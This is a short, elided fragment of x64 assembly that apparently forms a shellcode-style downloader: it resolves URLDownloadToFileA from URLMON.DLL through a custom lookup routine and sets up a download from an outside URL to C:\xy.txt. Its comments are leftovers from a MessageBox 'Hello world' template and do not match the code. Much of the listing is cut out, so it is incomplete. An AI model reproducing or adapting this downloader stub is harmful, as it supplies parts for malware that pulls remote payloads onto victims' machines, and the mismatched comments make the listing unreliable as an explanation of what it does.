...
MAIN proc
    sub rsp, 50h            ;reserve stack space for called functions
...
;------------------------------------------------------------------------------
    ...
    lea rdx, urlfile_func 
    lea rcx, urmon_dll 
    call lookup_api         ;get address of MessageBoxA

	sub rsp,40h	
    xor r9, r9              ;MB_OK
    lea r8, szfilename       ;caption
    lea rdx, szurl      ;Hello world
...
;pcaller   0
szurl   db  'http://bflow.security-portal.cz/down/xy.txt',0
szfilename  db 'C:\xy.txt',0
;reserved   0
;lpfncb     0

urmon_dll          db 'URLMON.DLL',0
urlfile_func       db  'URLDownloadToFileA',0
